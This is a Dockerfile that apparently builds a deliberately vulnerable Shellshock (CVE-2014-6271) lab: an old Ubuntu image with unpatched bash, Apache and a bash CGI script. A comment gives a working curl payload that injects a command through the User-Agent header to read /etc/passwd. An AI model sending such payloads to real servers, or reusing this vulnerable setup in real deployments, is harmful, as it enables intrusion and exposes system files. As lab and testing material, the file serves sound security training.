FROM ubuntu:14.04
# ── Shellshock — CVE-2014-6271 ───────────────────────────────
# Bash 4.3 patch 25 and earlier: env var function exploit via CGI
# Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://172.20.0.23/cgi-bin/test.cgi
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y \
    apache2 bash \
    && rm -rf /var/lib/apt/lists/*

# Ubuntu 14.04 ships bash 4.3 patch 25 — vulnerable to Shellshock
# Verify: bash --version should show 4.3.11(1)

# Enable CGI
RUN a2enmod cgi
RUN mkdir -p /usr/lib/cgi-bin

# Create vulnerable CGI script
RUN echo '#!/bin/bash\necho "Content-type: text/html"\necho ""\necho "<html><body>"\necho "<h1>Test CGI</h1>"\necho "<p>Hello from bash $(bash --version | head -1)</p>"\necho "</body></html>"' > /usr/lib/cgi-bin/test.cgi
RUN chmod 755 /usr/lib/cgi-bin/test.cgi

# Also create /cgi-bin symlink
RUN ln -sf /usr/lib/cgi-bin /var/www/html/cgi-bin

# Apache config for CGI
RUN echo '<Directory "/usr/lib/cgi-bin">\n    AllowOverride None\n    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch\n    Require all granted\n</Directory>' >> /etc/apache2/conf-enabled/serve-cgi-bin.conf

EXPOSE 80

CMD ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
